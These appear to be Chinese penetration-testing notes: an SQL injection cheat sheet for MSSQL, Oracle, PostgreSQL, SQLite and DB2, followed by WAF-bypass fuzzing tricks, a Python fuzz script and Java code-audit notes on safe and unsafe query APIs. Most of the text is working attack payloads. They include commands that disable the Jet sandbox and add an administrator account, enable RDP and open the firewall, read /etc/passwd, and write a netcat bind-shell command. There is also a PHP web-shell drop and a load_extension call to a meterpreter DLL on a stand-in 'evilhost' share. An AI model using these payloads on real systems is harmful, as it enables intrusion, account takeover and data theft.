CLR有点繁琐，参考文章：https://www.cnblogs.com/wh4am1/p/11669539.html



### SQL Server 沙盒

```sql
exec sp_configure 'show advanced options',1;reconfigure;
-- 不开启的话在执行xp_regwrite会提示让我们开启，
exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;

-- 关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;

-- 查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。
exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

-- 执行系统命令
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net user test test /add")')
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net localgroup administrators test /add")')

沙盒模式SandBoxMode参数含义（默认是2）
`0`：在任何所有者中禁止启用安全模式
`1` ：为仅在允许范围内
`2` ：必须在access模式下
`3`：完全开启

openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。

-- 恢复配置
-- exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;
-- exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;
-- exec sp_configure 'show advanced options',0;reconfigure;

```



**sql server常用操作远程桌面语句:**

```bash
# 1.查看是否开启远程桌面,1表示关闭,0表示开启
EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections'


# 2.读取远程桌面端口
EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp','PortNumber'


# 3.开启远程桌面
EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal
Server','fDenyTSConnections','REG_DWORD',0;

#reg文件开启远程桌面:
Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
Server]"fDenyTSConnections"=dword:00000000[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp]"PortNumber"=dword:00000d3d
#保存micropoor.reg,并执行regedit /s micropoor.reg

#注:如果第一次开启远程桌面,部分需要配置防火墙规则允许远程端口。
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow


# 4.关闭远程桌面
EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal
Server','fDenyTSConnections','REG_DWORD',1;

```















# OracleSQL注入

## 注入流程

```bash
#1.判断数据库为oracle
提交注释字符/*，返回正常即是MySQL，否则继续提交注释符号--，该符号是Oracle和MSSQL支持的注释符，返回正常就需要继续判断。
可以继续提交多语句支持符号; 如果支持多行查询，说明是MSSQL，因为Oracle不支持多行查询，可以继续提交查询语句：

#oracle：独有的虚拟表 dual：    
(select count(*) from dual)<>0


#2.order by 定字段


#Union联合查询：
#3.一个一个去判断字段类型
union select null,null from dual
#确定是str型的
id=-1%20union%20select%20%27a%27,%27null%27%20from%20dual

#4.数据库
union%20select%20(select%20instance_name%20from%20v$instance),%272%27%20from%20dual

#5.爆数据表
union select (select table_name from all_tables where rownum=1 and table_name like  '%user%'),'2' from dual

#6.爆字段名
第一个字段
 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users') from dual
第二个字段
union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users' and column_name <> 'user_name') from dual

#7.爆数据
#爆某表中的第一行数据：
union select 1,字段1||字段2...||字段n from 表名 where rownum=1 --
第一个
union select user_name,user_pwd from "sns_users" 
第二个
union select user_name,user_pwd from "sns_users"  where user_name <> 'hu'



------


```



## 常用查询

```bash
# 查看数据库版本
SELECT user FROM dual UNION SELECT * FROM v$version

# 查看当前用户：
SELECT user FROM dual;

# 列出所有用户：
SELECT username FROM all_users ORDER BY username;

# 列出数据库
SELECT DISTINCT owner FROM all_tables;

# 列出表名：
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';

# 列出字段名：
SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;

# 定位DB文件：
SELECT name FROM V$DATAFILE;
```





## 联合注入

```
?id=-1' union select user,null from dual--

?id=-1' union select version,null from v$instance--

?id=-1' union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--

?id=-1' union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=2)--

?id=-1' union select username,passwd from users--

?id=-1' union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)--
```

###  

## 报错注入

```
?id=1' and 1=ctxsys.drithsx.sn(1,(select user from dual))--

?id=1' and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like 'Oracle%))--

?id=1' and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--

?id=1' and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=3))--

?id=1' and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))--
```



## 盲注

### 布尔盲注

既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用IF the else end if这种复杂的，还可以使用 `decode() `函数。
语法：`decode(条件,值1,返回值1,值2,返回值2,...值n,返回值n,缺省值);`

该函数的含义如下：

```
IF 条件=值1 THEN　　　　
		RETURN(返回值1)
ELSIF 条件=值2 THEN　　　　
		RETURN(返回值2)　　　　
		......
ELSIF 条件=值n THEN　　　　
	RETURN(返回值n)
ELSE　　　　
	RETURN(缺省值)
END IF
```

```bash
?id=1' and 1=(select decode(user,'SYSTEM',1,0,0) from dual)--

?id=1' and 1=(select decode(substr(user,1,1),'S',1,0,0) from dual)--

?id=1' and ascii(substr(user,1,1))> 64--  #二分法
```



### 时间盲注

可使用`DBMS_PIPE.RECEIVE_MESSAGE('任意值',延迟时间)`函数进行时间盲注，这个函数可以指定延迟的时间

```bash
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                 comment:   -- /**/
```

```bash
?id=1' and 1=(case when ascii(substr(user,1,1))> 128 then DBMS_PIPE.RECEIVE_MESSAGE('a',5) else 1 end)--

?id=1' and 1=(case when ascii(substr(user,1,1))> 64 then DBMS_PIPE.RECEIVE_MESSAGE('a',5) else 1 end)--
```



decode不仅可以在布尔盲注中运用，也可以用在延迟盲注中

```
and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',10),0) from dual) --
 
 http://www.jsporcle.com/news.jsp?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',5),0) from dual) --
```

当然，这里延迟的操作不一定用延迟函数，也可以使用花费更多时间去查询所有数据库的条目。例如:

`(select count(*) from all_objects) `

```
http://www.jsporcle.com/news.jsp?id=1 and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) and '1'='1'
```

通过这种明显时间差也能判断注入表达式的结果。







# PostgreSQL注入

## 注入流程

```bash
#order by  猜字段
219.153.49.228:47148/new_list.php?id=1 order by 4

#判断是否为postgresql
?id=1 and 1::int=1--


#全部用null填充 方便在测试类型
?id=-1 union select null,null,null,null 

#测试类型，  这里为字符类型
?id=-1  union select null,'null','null',null

#当前数据库
?id=-1 union select null,current_database(),'null',null

#表名       
?id=-1 union select null,relname,'null',null from pg_stat_user_tables limit 1 offset 1

#列名   分析解说：通过SQL语句中联合查询，修改offset后面的数字得到2个字段，和字段名
?id=-1 union select null,column_name,'null',null from+information_schema.columns where table_name='reg_users' limit 1 offset 1

#字段值     offset不断改变值，依次获取值   通过SQL语句联合查询，显示出key的MD5值。
?id=-1 union select null,'null','用户名:'||name||',密码:'||password||',状态:'||status||',id:'||id,null from reg_users limit 1 offset 0



```

## 常用查询

注释

```
--
/**/  
```

查看数据库版本

```
SELECT version()
```

查看当前用户

```
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

查看当前用户是否超级用户

```
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER
```

列数据库

```
SELECT datname FROM pg_database
```

列出表

```
SELECT table_name FROM information_schema.tables
```

列出列名

```
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```



## 报错注入

```
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)

,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--

,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--

,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)



' and 1=cast((SELECT concat('DATABASE: 

',current_database())) as int) and '1'='1

' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1

' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1

' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```



## 盲注

```
' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO

```



### 时间盲注

```
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```



## 文件操作

**读取文件**

```
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```

早期版本的`pg_read_file`和`pg_ls_dir`不支持绝对路径，但是新版本将允许超级用户或者在`default_role_read_server_files`组中的用户使用:

```
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

```
SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID

SELECT lo_get(16420); -- use the OID returned from the above

SELECT * from pg_largeobject; -- or just get all the large objects and their data
```



**写文件**

```
CREATE TABLE pentestlab (t TEXT);

INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');

SELECT * FROM pentestlab;

COPY pentestlab(t) TO '/tmp/pentestlab';
```

一行：

```bash
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```





## Bypass Filter

Using `CHR`

```
SELECT CHR(65)||CHR(66)||CHR(67);
```

Using `Dollar-signs` ( >= version 8 PostgreSQL)

```
SELECT $$This is a string$$
SELECT $TAG$This is another string$TAG$
```





# SQLite注入

## SQLite comments

```
--
/**/
```

## SQLite version

```
select sqlite_version();
```

## String based - Extract database structure

```
SELECT sql FROM sqlite_schema
```

## Integer/String based - Extract table name

```
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

Use limit X+1 offset X, to extract all tables.

## Integer/String based - Extract column name

```
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```

For a clean output

```
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

## Boolean - Count number of tables

```
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
```

## Boolean - Enumerating table name

```
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
```

## Boolean - Extract info

```
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

## Time based

```
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```

## Remote Command Execution using SQLite command - Attach Database

```
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ('<?php system($_GET['cmd']); ?>');--
```

## Remote Command Execution using SQLite command - Load_extension

```
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

Note: By default this component is disabled



## DB2注入

### Version

```
select versionnumber, version_timestamp from sysibm.sysversions;
select service_level from table(sysproc.env_get_inst_info()) as instanceinfo
select getvariable('sysibm.version') from sysibm.sysdummy1 -- (v8+)
select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo
select service_level,bld_level from sysibmadm.env_inst_info
```

### Comments

```
select blah from foo -- comment like this (double dash)
```

### Current User

```
select user from sysibm.sysdummy1
select session_user from sysibm.sysdummy1
select system_user from sysibm.sysdummy1
```

### List Users

DB2 uses OS accounts

```
select distinct(authid) from sysibmadm.privileges -- priv required
select grantee from syscat.dbauth -- incomplete results
select distinct(definer) from syscat.schemata -- more accurate
select distinct(grantee) from sysibm.systabauth -- same as previous
```

### List Privileges

```
select * from syscat.tabauth -- shows priv on tables
select * from syscat.tabauth where grantee = current user -- shows privs for current user
select * from syscat.dbauth where grantee = current user;;
select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies
```

### List DBA Accounts

```
select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'
select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’
```

### Current Database

```
select current server from sysibm.sysdummy1
```

### List Databases

```
select distinct(table_catalog) from sysibm.tables
SELECT schemaname FROM syscat.schemata;
```

### List Columns

```
select name, tbname, coltype from sysibm.syscolumns -- also valid syscat and sysstat
```

### List Tables

```
select table_name from sysibm.tables
select name from sysibm.systables
```

### Find Tables From Column Name

```
select tbname from sysibm.syscolumns where name='username'
```

### Select Nth Row

```
select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only
```

### Select Nth Char

```
select substr('abc',2,1) FROM sysibm.sysdummy1 -- returns b
```

### Bitwise AND/OR/NOT/XOR

```
select bitand(1,0) from sysibm.sysdummy1 -- returns 0. Also available bitandnot, bitor, bitxor, bitnot
```

### ASCII Value

```
Char	select chr(65) from sysibm.sysdummy1 -- returns 'A'
```

### Char -> ASCII Value

```
select ascii('A') from sysibm.sysdummy1 -- returns 65
```

### Casting

```
select cast('123' as integer) from sysibm.sysdummy1
select cast(1 as char) from sysibm.sysdummy1
```

### String Concat

```
select 'a' concat 'b' concat 'c' from sysibm.sysdummy1 -- returns 'abc'
select 'a' || 'b' from sysibm.sysdummy1 -- returns 'ab'
```

### IF Statement

Seems only allowed in stored procedures. Use case logic instead.

### Case Statement

```
select CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB' END from sysibm.sysdummy1
```

### Avoiding Quotes

```
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1 -- returns “ADRI”. Works without select too
```

### Time Delay

Heavy queries, for example: If user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response. However, if user doesn't start with ascii 68, the heavy query won't execute and thus the response will be faster.

```
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
```

### Serialize to XML (for error based)

```
select xmlagg(xmlrow(table_schema)) from sysibm.tables -- returns all in one xml-formatted string
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- Same but without repeated elements
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns all in one xml-formatted string (v8). May need CAST(xml2clob(… AS varchar(500)) to display the result.
```

### Command Execution and Local File Access

Seems it's only allowed from procedures or UDFs.

### Hostname/IP and OS INFO

```
select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info -- requires priv
```

### Location of DB Files

```
select * from sysibmadm.reg_variables where reg_var_name='DB2PATH' -- requires priv
```

### System Config

```
select dbpartitionnum, name, value from sysibmadm.dbcfg where name like 'auto_%' -- Requires priv. Retrieve the automatic maintenance settings in the database configuration that are stored in memory for all database partitions.
select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg -- Requires priv. Retrieve all the database configuration parameters values stored on disk for all database partitions.
```

### Default System Database

- SYSIBM
- SYSCAT
- SYSSTAT
- SYSPUBLIC
- SYSIBMADM
- SYSTOOLs





# Bypass



把每个SQL关键字两侧可插入的点称之为“位”，如下图：

![](http://image.xpshuai.cn/img/image-20220119124547715.png)



## 位置一

(1)注释符

```bash
/**/ 
%23 
--+ 
/*!50000union*/

# 
id=2/**/union select 1,user,3 from admin
```



(2)空白符

```
%09
%0a
%0b
%0c
%0d
%20
%a0

# 
id= 1 %0a union select 1,user,3 from admin
```



(3)科学计算法

```bash
# e 
# .



id= 2e0 union select 1,user,3 from admin

id= 1.union select 1,user,3 from admin

id= 1.1union select 1,user,3 from admin

# 还有:   %1%2E   %2%2E    %3%2E   

id= 1'  %1%2Eunion select user(),2 %23
```



(4)单引号双引号

```bash
id= 1'  'xx'union select user(),2 %23

id= 1'  ""union select user(),2 %23

# 需要闭合的先闭合，然后成对使用单双引号
```



(5)x@

假设SQL语句为：`select * from article where id = '2'`

```bash
# %@ *@ -@ +@ /@ <@ =@ >@ ^@ |@ %26@ -@'' -@"" -@@new


id='  -@ union select 1,2 ,3 %23

id='  %26@ union select 1,2 ,3 %23

id='  -@'' union select 1,2 ,3 %23

id=' -@@new  union select 1,2 ,3 %23
```



(6){x key}

假设SQL语句为：`select * from article where id = '2'`

```
id=' and {x -2} union select 1,2,3 %23

id='  ||  !{`x` -2} union select 1,2,3 %23

id='  ||  !{`x` -@} union select 1,2,3 %23

id='  and {x  id} union select 1,2,3 %23

id='  and {x  id} union select 1,2,3 %23

id=' and {id (select/**/--0)}union select 1,2,3 %23

```

(7) 其他

```
\Nunion select 1,2,3 %23

null union select 1,2,3 %23
```



(8)函数

```
and  MD5('a') union select 1,password,database() from users--+

and binary @ union select 1,password,3 from users--+

and  ST_X(Point(1, 2)) union select 1,password,database() from users--+
```





## 位置二

(1) 空白符

```
%09,%0a,%0b,%0c,%0d,%20
id= 1  union%0aselect 1,user,3 from admin
```

(2)注释

```
/*!*/ /**/
id= 1  union /**/select 1,user,3 from admin
```

(3)括号

```
union(select  1,(password),3,4,5,6 from(users)) %23
```

(4) ALL | DISTINCT | DISTINCTROW

```
union ALL select  1,password,3 from users %23
```

(5)函数分隔

```
%09%0A
%0D%0b
%0b%0A
%09%0C
%09%23%0A
--%0A
%23%0A
--+\N%0A
%23%f0%0A
...
union%23%0Aselect  1,password,3 from users %23

union-- xx%0Aselect  1,password,3 from users %23
```





## 位置三

(1) 空白符

```
%09,%0a,%0b,%0c,%0d,%20

union select %09 1,password,3 from users %23
```

(2)注释

```
/*!*/ /**/

union select /**/ 1,password,3 from users %23
```

(3) ALL | DISTINCT | DISTINCTROW

```
union select ALL  1,password,3 from users %23
```

(4) {} ()

```
union select{x 1},password,3 from users %23

union select(1),password,3 from users %23
```

(5)符号

```
+ - @ ~ !
union select+1,password,3 from users %23
" ' 单双引号
union select""a1,password,3 from users %23
union select+1,password,3 from users %23
```

组合

```
+@ +'' -@ -'' ~@ ~'' ~"" !@ !"" @$ @. \N$
...
union select+@a1,password,3 from users %23

union select\N$a1,password,3 from users %23
```

(6)函数

```
union select  MD5('a') |1,2,database() from users--+

union select reverse('xx'),password,3 from users %23

union select ST_X(Point(1, 2))a,2,database() from users--+
```







## 位置四

(1) 空白符

```
%09,%0a,%0b,%0c,%0d,%20,%23,%27

-1' union select 1,2,user()%23from users--+
```

(2)注释

```
/*!*/
/**/

-1' union select 1,2,user()/**/from users--+
```

(3) 反引号

```
1' union select 1,2,password ``from users`` --+
```



(4)花括号

```
1' union select 1,2,{x password}from users --+

1' union select 1,2,(password)from users --+
```

(5) 符号

\N

```
1' union select 1,password,\Nfrom users --+
```



单双引号

```
1' union select 1,user(),""from users --+
```



e .

```
1' union select 1,password,3e1from users --+

1' union select 1,password,3.1from users --+
```



**组合**

```
\N%0C  \N%23  \N%27  %7E\N  %21\N  %27\N   %2D\N  %7E\N %2D%2D%0A
%27--  --%40   --%27 --""
...


1' union select 1,user(),\NXXXX%23from users --+

1' union select 1,user(),%27XXXX--from users --+
```





## 位置五

(1) 空白符

```bash
# %09,%0a,%0b,%0c,%0d,%20,%2E

1' union select 1,2,user() from%0dusers--+
```

(2)注释

```bash
/*!*/ 
/**/

-1' union select 1,2,user() from /**/users--+
```



(3)花括号

```
1' union select 1,user(),3 from(users) --+  

1' union select 1,user(),3 from{x users} --+
```





## FUZZ

已经知道上面五个位置了，单一姿势是无法奏效绕过的，有些姿势也是需要大量 FUZZ 得到，使用大量字符编码对 SQL 语句的“位”进行 FUZZ，可以自己编写脚本进行fuzz实现bypass。这里直接贴别人的代码了懒得自己写(自己实现的时候按照这个思路进行散发即可)：

```python
import requests
import itertools


List = ['%20','%09','%0a','%0b','%0c','%0d','%2d%2d','%23','%a0','%2D%2D%2B','%5C%4E','\\N']

count = 0
num = 2 #fuzz num 个字符组合
target = 'http://localhost/sqli-labs-master/Less-1/?id=-1\' '

for i in itertools.product(List,repeat=num):

    count += 1
    print(count,':',len(List)**num)

    str = ''.join((i))
    payload = '{}union select 1,user(),3 from users %23'.format(str)
    url = target + payload
    req = requests.get(url=url)

    if "root@localhost" in req.text:
        print(url)
        with open("result.txt",'a',encoding='utf-8') as r:
            r.write(str + "\n")
```







# 代码审计

## Java

### Java中执行SQL语句的几种方式

#### 1.使用JDBC的`java.sql.Statement`执行SQL语句（原生方式）

是执行SQL语句的原生方式，需要通过拼接来执行，若拼接的语句没有经过过滤，将出现SQL注入漏洞

```java
import java.sql.*;

public class TestSQL {
    public static void main(String []args) throws Exception {

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/jsxp_test?useUnicode=true&characterEncoding=utf-8&useSSL=false&serverTimezone=UTC","test","test123");

        try {
            String id = "56";
            String sql = "select * from cms_tag where f_tag_id=" + id;
            Statement statement = con.createStatement();
            ResultSet rs = statement.executeQuery(sql);
            while (rs.next()){
                System.out.println("id: "+rs.getInt("f_tag_id") + ", name=" + rs.getString("f_name"));
            }

        }catch (Exception e){
            e.printStackTrace();
        }


    }


    }
```





#### 2.使用JDBC的`java.sql.PreparedStatement`执行SQL语句

PreparedStatement是继承`statement`的子接口，包含已编译的SQL语句。

PreparedStatement会预处理SQL语句，SQL语句可具有一个或多个IN参数。IN参数的值在SQL语句创建时未被指定，而是为每个IN参数保留一个问号(?)作为占位符。每个问号的值，必须在该语句执行之前通过适当的`setXXX`方法来提供。如果是int型则用`setInt`，如果是string则用`setString`方法。

优势：速度快；防止SQL注入

```
//package src.main.java;

import java.sql.*;

public class TestSQL {
    public static void main(String []args) throws Exception {

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/jsxp_test?useUnicode=true&characterEncoding=utf-8&useSSL=false&serverTimezone=UTC","test","test123");

        try {
            String f_tag_id = "56";
            String sql = "select * from cms_tag where f_tag_id= ?";
            PreparedStatement pstatement = con.prepareStatement(sql);
            //设置占位符id变量(第一个参数为第几个?的索引)
            pstatement.setString(1, f_tag_id);
            //执行
            ResultSet rs = pstatement.executeQuery();
            while (rs.next()){
                System.out.println("id: "+rs.getInt("f_tag_id") + ", name=" + rs.getString("f_name"));
            }

        }catch (Exception e){
            e.printStackTrace();
        }


    }


    }

```







#### 3.使用Herbinate执行SQL语句

Hibernate将Java类映射到数据库表中，从Java数据类型映射到SQL数据类型，采用Hibernate查询语言（HQL）。

HQL语法与SQL类似，但有些许不同。

Hibernate对持久化类的对象进行操作也不是直接对数据库进行操作，因此HQL由Hibernate引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自Hibernate引擎。



**Hibernate有几种HQL参数绑定的方式可以有效避免SQL注入：**

1.按命名参数绑定（参数名字）

  在HQL语句中定义命名参数要用”:”开头

```java
Query<User> query=session.createQuery(“from User user where user.name=:username  ”);
String parm = "Liming";
query.setString("name", parm);
```

2.按参数位置邦定：

在HQL查询语句中用”?”来定义参数位置，形式如下：

```java
Query query=session.createQuery(“from User user where user.name=? and user.age =? ”);
query.setString(0,name);
query.setInteger(1,age);	// 索引，变量


// 　同样使用setXXX()方法设定绑定参数，只不过这时setXXX()方法的第一个参数代表绑定参数在HQL语句中出现的位置编号（由0开始编号），第二个参数仍然代表参数实际值。
```

> 注：在实际开发中，提倡使用按名称绑定命名参数，因为这不但可以提供非常好的程序可读性，而且也提高了程序的易维护性，因为当查询参数的位置发生改变时，按名称邦定名参 数的方式中是不需要调整程 序代码的。



3.命名参数列表



4.类实例（JavaBean）

在Hibernate中可以使用setProperties()方法，将命名参数与一个对象的属性值绑定在一起，如下程序代码：

```java
Customer customer=new Customer();
customer.setName(“pansl”);
customer.setAge(80);
Query query=session.createQuery(“from Customer c where c.name=:name and c.age=:age ”);
query.setProperties(customer);
```



5.setParameter()方法：

　在Hibernate的HQL查询中可以通过setParameter()方法邦定任意类型的参数，如下代码:

```
String hql=”from User user where user.name=:customername ”;
Query query=session.createQuery(hql);
query.setParameter(“customername”,name,Hibernate.STRING);
```

　　如上面代码所示，setParameter()方法包含三个参数，分别是命名参数名称，命名参数实际值，以及命名参数映射类型。对于某些参数类型setParameter()方法可以根据参数值的Java类型，猜测出对应的映射类型，因此这时不需要显示写出映射类型，像上面的例子，可以直接这样写:`query.setParameter(“customername”,name);`但是对于一些类型就必须写明映射类型，比如java.util.Date类型，因为它会对应Hibernate的多种映射类型，比如Hibernate.DATA或者Hibernate.TIMESTAMP。





#### 4.使用MyBatis执行SQL语句

MyBatis是一个Java持久化框架，他通过XML描述符或注解把对象与存储过程或SQL语句连接起来

- #{变量} 可以防止注入，底层是用prepareStatement实现的/使用占位符?来实现的
- ${变量} 不能防注入，底层的用拼接实现的



**小例子:**

1、新建一个maven项目，在pom文件中添加mybatis依赖及MySQL依赖

```xml
<!-- mybatis核心依赖 -->
    <!-- https://mvnrepository.com/artifact/org.mybatis/mybatis -->
    <dependency>
        <groupId>org.mybatis</groupId>
        <artifactId>mybatis</artifactId>
        <version>${mybatis.version}</version>
    </dependency>
    
    <!-- mysql驱动 -->
    <dependency>
        <groupId>mysql</groupId>
        <artifactId>mysql-connector-java</artifactId>
        <version>${mysql.version}</version>
    </dependency>
```



mybatis配置文件：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<!-- mybatis核心配置，用于配置相关数据源以及连接池等信息，以及实体类的别称映射，插件配置等等 -->
<configuration>
    <!-- 指定实体类的别名，方便在mapper配置中进行引用 -->
    <typeAliases>
        <!-- 方法1、定义一个alias别名，缺点在于需要一个实体类分别指定
        <typeAlias type="edu.nf.ch01.entity.Users" alias="user" />-->
        <!-- 方法2、也可以使用package来给某个包下面的所有实体类自动创建别名，
        自动创建的别名规则是类的类名并将首字母改为小写 -->
        <package name="edu.nf.ch01.entity"/>
    </typeAliases>
    <!-- 配置数据源环境，default指定默认的数据源 -->
    <environments default="mysql">
        <!-- 创建一个MySQL的数据源环境，id就叫mysql -->
        <environment id="mysql">
            <!-- 配置事务管理，这里有JDBC和MANAGED两个值
             JDBC：使用本地jdbc的事务
             MANAGED：mybatis不参与事务管理，由运行容器来管理事务-->
            <transactionManager type="JDBC"/>
            <!-- 配置数据源，type指定获取连接的方式，有以下几个值：
             POOLED：使用mybatis自带的数据库连接池（方便连接的复用）
             UNPOOLRF：不使用连接池，而是每次请求都从数据库去获取连接
              JMDI：通过查找JNDI树去获取数据源对象，通常结合web容器或者EJB容器来配置 -->
            <dataSource type="POOLED">
                <!-- 配置数据源信息，驱动，url，连接的账号密码等 -->
                <property name="driver" value="com.mysql.jdbc.Driver"/>
                <property name="url" value="jdbc:mysql://localhost:3306/mybatis?useUnicode=true&characterEncoding=utf-8"/>
                <property name="username" value="root"/>
                <property name="password" value="root"/>
            </dataSource>
        </environment>
    </environments>

    <!-- 指定mapper配置文件 -->
    <mappers>
        <mapper resource="mapper/UsersMapper.xml" />
    </mappers>
</configuration>
```



UsersMapper.xml：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<!-- mapper根节点的namespace指定Dao接口的完整类名，
因为mybatis在解析的时候要根据这个类名找到相应dao方法执行 -->
<mapper namespace="edu.nf.ch01.dao.UserDao">
